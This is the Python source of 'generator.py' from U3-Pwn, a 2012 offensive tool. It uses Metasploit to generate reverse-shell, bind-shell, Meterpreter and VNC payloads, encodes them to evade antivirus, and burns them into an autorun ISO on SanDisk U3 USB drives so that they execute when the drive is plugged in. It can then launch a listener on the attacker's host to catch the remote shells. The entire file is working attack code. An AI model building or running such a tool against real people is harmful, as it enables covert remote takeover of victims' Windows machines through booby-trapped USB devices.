#!/usr/bin/env python
# -*- coding: latin-1 -*- ######################################################
#                ____                     _ __                                 #
#     ___  __ __/ / /__ ___ ______ ______(_) /___ __                           #
#    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                           #
#   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                            #
#                                            /___/ team                        #
#                                                                              #
# generator.py                                                                 #
#                                                                              #
# DATE                                                                         #
# 06/27/2012                                                                   #
#                                                                              #
# DESCRIPTION                                                                  #
# U3-Pwn is a tool designed to automate injecting executables to Sandisk       #
# smart usb devices with default U3 software install. This is performed by     # 
# removing the original iso file from the device and creating a new iso        #
# with autorun features.                                                       #
#                                                                              #
# REQUREMENTS                                                                  #
# - Metasploit                                                                 #
# - U3-Tool                                                                    #
# - Python-2.6                                                                 #
#                                                                              #
# AUTHOR                                                                       #
# Zy0d0x - http://www.nullsecurity.net/                                        #
#                                                                              #
################################################################################


try:
    import subprocess
    import time
    import os
    import sys
    import pexpect
    import shutil
except ImportError:
    pass
definepath = os.getcwd()
sys.path.append('%s/src/' % definepath)
import banner

try:
    banner.print_banner()
    payload = \
        raw_input('''    What payload do you want to generate:

    Name:                                       Description:
    -----                                       ------------

    1) Windows Shell Reverse_TCP                Windows Command Shell, Reverse TCP Stager   
    2) Windows Reverse_TCP Meterpreter          Windows Meterpreter (Reflective Injection), Reverse TCP Stager
    3) Windows Reverse_TCP VNC DLL              VNC Server (Reflective Injection), Reverse TCP Stager
    4) Windows Bind Shell                       Windows Command Shell, Bind TCP Stager
    5) Windows Bind Shell X64                   Windows x64 Command Shell, Bind TCP Inline             
    6) Windows Shell Reverse_TCP X64            Windows x64 Command Shell, Windows x64 Reverse TCP Stager
    7) Windows Meterpreter Reverse_TCP X64      Windows x64 Meterpreter, Windows x64 Reverse TCP Stager      
    8) Windows Meterpreter Reverse HTTPS        Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager  
    9) Windows Meterpreter Reverse DNS          Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
   10) ShellCodeExec Alphanum Shellcode         This will drop a meterpreter payload through shellcodeexec (A/V Safe)
      
   Enter number: ''')

    if payload == '1':
        payload = 'windows/shell/reverse_tcp'
    if payload == '2':
        payload = 'windows/meterpreter/reverse_tcp'
    if payload == '3':
        payload = 'windows/vncinject/reverse_tcp'
    if payload == '4':
        payload = 'windows/shell/bind_tcp'
    if payload == '5':
        payload = 'windows/x64/shell/bind_tcp'
    if payload == '6':
        payload = 'windows/x64/shell/reverse_tcp'
    if payload == '7':
        payload = 'windows/x64/meterpreter/reverse_tcp'
    if payload == '8':
        payload = 'windows/meterpreter/reverse_https'
    if payload == '9':
        payload = 'windows/meterpreter/reverse_dns'

    banner.print_banner()
    encoder = \
        raw_input('''    What encoder would you like to try and bypass AV with.
    
    Name:                              Description:
    -----                              -----------
     
    1) avoid_utf8_tolower              Avoid UTF8/tolower               
    2) shikata_ga_nai                  Polymorphic XOR Additive Feedback Encoder 
    3) alpha_mixed                     Alpha2 Alphanumeric Mixedcase Encoder
    4) alpha_upper                     Alpha2 Alphanumeric Uppercase Encoder  
    5) call4_dword_xor                 Call+4 Dword XOR Encoder  
    6) countdown                       Single-byte XOR Countdown Encoder  
    7) fnstenv_mov                     Variable-length Fnstenv/mov Dword XOR Encoder  
    8) jmp_call_additive               Jump/Call XOR Additive Feedback Encoder  
    9) nonalpha                        Non-Alpha Encoder  
   10) nonupper                        Non-Upper Encoder  
   11) unicode_mixed                   Alpha2 Alphanumeric Unicode Mixedcase Encoder 
   12) unicode_upper                   Alpha2 Alphanumeric Unicode Uppercase Encoder                          
   13) No Encoding                     Standard Payload Generation  
   14) Multi-Encoder                   Multiple Iteration Encoding 

    
   Enter number: ''')

    if encoder == '1':
        encoder = 'x86/avoid_utf8_tolower'
    if encoder == '2':
        encoder = 'x86/shikata_ga_nai'
    if encoder == '3':
        encoder = 'x86/alpha_mixed'
    if encoder == '4':
        encoder = 'x86/alpha_upper'
    if encoder == '5':
        encoder = 'x86/call4_dword_xor '
    if encoder == '6':
        encoder = 'x86/countdown'
    if encoder == '7':
        encoder = 'x86/fnstenv_mov'
    if encoder == '8':
        encoder = 'x86/jmp_call_additive'
    if encoder == '9':
        encoder = 'x86/nonalpha'
    if encoder == '10':
        encoder = 'x86/nonupper'
    if encoder == '11':
        encoder = 'x86/unicode_mixed'
    if encoder == '12':
        encoder = 'x86/unicode_upper'
    if encoder == '':
        encoder = 'x86/shikata_ga_nai'

    ip = raw_input('''\n   Enter Ip Address for reverse listener: ''')
    port = raw_input('''\n   Enter the port of the Listener: ''')
    device = \
        raw_input('''\n   Enter the device to change iso image on (example /dev/sde1): '''
                  )

    if port == '':
        port = '4444'
    if ip == '' or device == '':
        print '''

   [-]Error Ip Address Or Device Missing Exiting....'''
        time.sleep(2)
        sys.exit(0)
    else:
        if payload == '10': 
            payload = 'windows/meterpreter/reverse_tcp'
            banner.print_banner()
            print '''\n  Generating Shellcode Please Wait...'''
            subprocess.Popen('msfpayload windows/meterpreter/reverse_tcp EXITFUNC=thread  LHOST=%s LPORT=%s R  | msfencode -c 5 -e %s -t raw  | msfencode  -a x86 -e  x86/alpha_mixed -t raw BufferRegister=EAX > resource/payload.txt'
                              % (ip, port, encoder),
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE, shell=True).wait()
            shellcode = open('resource/payload.txt', 'r')
            text = shellcode.readline()
            file = open('resource/LaunchU3.bat', 'w')
            file.write('LaunchU3.exe ' + text)
            file.close()
            os.remove('resource/payload.txt')
            shutil.copy('backup/LaunchU3.exe', 'resource/LaunchU3.exe')
            subprocess.Popen('mkisofs -volid U3\ System -o resource/U3\ System.iso resource/'
                             , stderr=subprocess.PIPE,
                             shell=True).wait()
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device)
            child1.sendline('y')
            time.sleep(5)
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device, shell=True).wait()
            os.remove('resource/LaunchU3.exe')
            os.system('rm resource/U3\ System.iso')
            os.remove('resource/LaunchU3.bat')
        else:

            banner.print_banner()
            print '''\n  Generating Shellcode Please Wait...'''
            subprocess.Popen('msfpayload %s LHOST=%s  LPORT=%s R  | msfencode  -e %s -t exe  > resource/LaunchU3.exe '
                              % (payload, ip, port, encoder),
                             stderr=subprocess.PIPE, shell=True).wait()
            file = open('resource/LaunchU3.bat', 'w')
            file.write('LaunchU3.exe')
            file.close()
            subprocess.Popen('mkisofs -volid U3\ System -o resource/U3\ System.iso resource/'
                             , stderr=subprocess.PIPE,
                             shell=True).wait()
            child1 = pexpect.spawn('u3-tool -v  -p 1302528 ' + device)
            child1.sendline('y')
            time.sleep(5)
            subprocess.Popen('u3-tool -v -l resource/U3\ System.iso %s'
                             % device, shell=True).wait()
            os.remove('resource/LaunchU3.exe')
            os.system('rm resource/U3\ System.iso')
            os.remove('resource/LaunchU3.bat')

    listener = \
        raw_input('''\n   Do you want to start a listener to receive the payload yes or no: '''
                  )
    if listener == 'yes' or listener == 'y':
        print '''\n   Starting Listener....'''
        subprocess.Popen('msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s E'
                          % (payload, ip, port), shell=True).wait()
    else:
        print '''   \n   Generation Complete Returning To Menu....'''
        time.sleep(2)
except KeyboardInterrupt:
    print '''

[-]Keyboard Interrupt Detected, Returning To Menu....'''
    time.sleep(2)
except Exception, error:
    print '''

[-]Something went wrong, printing error message....'''
    print error
    time.sleep(2)
    sys.exit(0)
